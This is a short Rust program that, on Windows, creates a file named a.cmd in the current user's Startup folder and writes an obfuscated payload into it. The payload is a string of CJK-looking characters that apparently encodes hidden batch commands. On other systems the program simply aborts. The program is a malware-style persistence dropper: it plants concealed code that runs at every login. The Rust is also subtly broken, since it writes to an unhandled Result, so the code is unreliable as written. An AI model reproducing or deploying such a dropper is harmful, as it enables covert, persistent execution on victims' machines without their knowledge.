use std::env;
use std::fs::File;
use std::io::prelude::*;
use users::get_current_username;

fn main() {
    if cfg!(windows) {
        let path = format!(
            "C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\a.cmd",
            get_current_username()
        );
        let file = File::create(path);
        file.write("䀦汣♳獀瑥∠쎳ꕶ愽䠶潙㥸䝎橆䨴獹䍺摓䵒䱬湱䉋睘扗㡁瘱杚伳㈰呵捕䕩䑖光牐䁥歰㔷⁴桭≦┊쎳ꕶ縺㜱ㄬ┥쎳ꕶ縺ⰲ┱댥盃㪥㑾ⰳ┱댥盃㪥㑾ⰲ┱쌥毃雃䋃┥쎳ꕶ縺㠴ㄬ┥쎳ꕶ縺㠳ㄬ┥쎳ꕶ縺㤲ㄬ┥쎳ꕶ縺ⰷ┱댥盃㪥㙾ⰰ┱┯쎳ꕶ縺㐱ㄬ┥쎳ꕶ縺〶ㄬ⼥댥盃㪥㙾ⰳ┱댥盃㪥㙾ⰰ┱┯쎳ꕶ縺㤵ㄬ┥쎳ꕶ縺〶ㄬ┥쎳ꕶ縺㤳ㄬ").unwrap();
    } else {
        std::process::abort();
    }
}
